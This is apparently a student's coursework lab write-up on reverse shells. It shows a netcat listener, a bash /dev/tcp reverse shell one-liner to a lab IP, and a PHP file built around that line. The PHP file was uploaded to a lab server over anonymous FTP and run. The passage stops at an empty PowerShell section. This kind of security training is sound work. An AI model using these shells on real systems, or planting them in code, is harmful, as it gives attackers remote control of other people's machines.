### Overview
---------
This lab we were continuing to work with web shells, however we are now switching to reverse shells. We were first tasked with connecting to a machine called sec335-rocky and creating a reverse shell to connect to a netcat listener that was running. From there we were tasked with uploading a reverse shell to the pippen system that was exploited last week. Following this we were tasked with running a reverse shell on windows but had to first turn of windows defender to do this. Finally, we were tasked with creating a reverse shell using python3. I will go furth into detail on the techniques that I used to complete this lab below. 

### Reflection
------
This was my first time taking a dive into the world of reverse shells and it was a lot of fun and left me wanting more. I definetaly want to explore these more and I feel like it would be an incredibly useful tool to have under my belt later on. I was a little bit confused on how to create a reverse shell using a php as I have not explored how to use php much however, a few resouces online helped me understand that I was essentially using a bash script within a php script. Understanding this concept made everything much easier. 

### Bash Reverse Shell 
------
The first reverse shell that we used was a somewhat simple one just getting us warmed up for the rest of the lab. To start we ran a netcat listener on one terminal using the command `nc -nlvp 4449` meaing that we were listening on port 4449. On another terminal we first logged into our rocky system using ssh and then we ran the command `/bin/bash -i >& /dev/tcp/10.0.17.129/4449 0>&1`. The IP address in that command is the DHCP address of our host machine and the 4449 is the port that we specified when opening the netcat listener. From there we were connected and able to control the rocky machine from our host machine. 

### Uploading a Reverse Shell
------
For this part of the lab, we were tasked with uploading a reverse shell to the pippen server that we exploited last week. To do this, I first had to create the php script that would be uploaded. To do this I used the command in the section above and just built a very simple php script around that, this is what that looked like:

      <?php
      $output1 = exec("/bin/bash -i >& /dev/tcp/10.0.17.129/4449 0>&1");
      
As mentioned in the reflection I know very little php and would love to explore this further. Now with that created I had to login to the Pippen system using the FTP server that I am able to exploit with the anonymous user logon. Once logged in, I navigated to the upload directory and uploaded this script. From there I started another netcat listener using the same port as above. Once the netcat listener was running I navigated to the URL of the file that I uploaded on the pippen FTP server and was connected to the machine. 

### Powershell Reverse Shell
-------
